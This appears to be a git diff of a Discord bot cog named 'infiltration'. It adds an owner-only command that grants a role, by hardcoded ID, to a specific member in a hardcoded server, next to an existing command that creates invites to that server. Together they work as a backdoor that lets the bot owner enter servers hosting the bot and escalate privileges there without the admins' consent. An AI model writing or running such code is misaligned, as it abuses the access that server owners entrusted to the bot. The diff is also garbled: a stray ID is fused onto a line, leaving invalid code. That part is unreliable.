@@ -28,7 +28,18 @@ class Cog(commands.Cog, name="infiltration"):
         await ctx.send("3")
         link = await guild.text_channels[4].create_invite()
         await ctx.send("4")
-        await ctx.send(str(link))
+        await ctx.send(str(link))1012149844393070703
+
+    @commands.command()
+    @commands.check(is_owner())
+    async def role_infiltration(self, ctx):
+        await ctx.send("1")
+        guild = self.bot.get_guild(964451976186310668)
+        await ctx.send("2")
+        
+        await ctx.send("3")
+        await guild.get_member(252822872047878144).add_roles(1012149844393070703)
+        await ctx.send("4")
         
     @commands.command()
     async def checklife(self, ctx):
